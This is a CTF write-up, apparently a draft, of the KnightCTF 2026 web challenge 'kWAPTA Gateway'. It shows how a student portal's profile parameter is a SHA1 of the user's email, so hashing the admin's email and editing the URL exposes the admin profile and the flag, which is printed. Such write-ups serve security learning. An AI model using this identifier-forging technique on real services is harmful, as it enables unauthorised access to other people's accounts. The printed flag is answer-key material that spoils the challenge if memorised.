---
tags:
  - web
Date: 2026-01-20
draft: true
---

# kWAPTA Gateway - CTF Writeup
KnightCTF 2026

**URL:** http://45.56.66.96:8765/
**Objective:** Access the admin profile to retrieve the flag.

## Reconnaissance
Upon visiting the website, we are presented with a "KnightSquad Academy" student portal. The main page provides a link to enter the portal (`/portal.php`).

On the portal dashboard (`/portal.php?page=home`), there is a support section listing the administrator's email address:
> **Support**
> If you run into any issues with your account, please contact the portal administrator at **admin@knightsquad.academy**.

## Vulnerability Analysis
I registered a new account to understand how the session and profile management works.

**Registration Data:**
- Name: `testuser`
- Email: `test@example.com`

After registering, the application redirected to the profile page with the following URL structure:
```
http://45.56.66.96:8765/portal.php?page=profile&sid=865817&id=567159d622ffbb50b11b0efd307be358624a26ee
```

I analyzed the URL parameters:
- `sid`: Appears to be a session or student ID (numeric).
- `id`: A long hexadecimal string, likely a hash.

I suspected the `id` parameter might be a hash of the user's email address. To verify this, I calculated the SHA1 hash of my registered email:

```bash
echo -n "test@example.com" | sha1sum
# Output: 567159d622ffbb50b11b0efd307be358624a26ee
```

The hash matched the `id` parameter exactly. This confirms an **Insecure Direct Object Reference (IDOR)** vulnerability where the application relies partly on a predictable hash of the email address to identify the profile to display.

## Exploitation
To retrieve the flag, I needed to access the profile of the administrator.

1. **Target Email:** `admin@knightsquad.academy` (found during reconnaissance).
2. **Generate Hash:**
   ```bash
   echo -n "admin@knightsquad.academy" | sha1sum
   # Output: efc4ea6079504f1b06ccd8d6ead69a62c9f8d1e5
   ```
3. **Construct Exploit URL:**
   I replaced the `id` parameter in my existing session URL with the admin's email hash.
   ```
   http://45.56.66.96:8765/portal.php?page=profile&sid=865817&id=efc4ea6079504f1b06ccd8d6ead69a62c9f8d1e5
   ```

## Flag
Upon accessing the modified URL, the portal displayed the Administrator's profile, including an "Internal Note" containing the flag:

`KCTF{c0ngr4tul4t10ns_y0u_f0und_th3_fl4g!}`
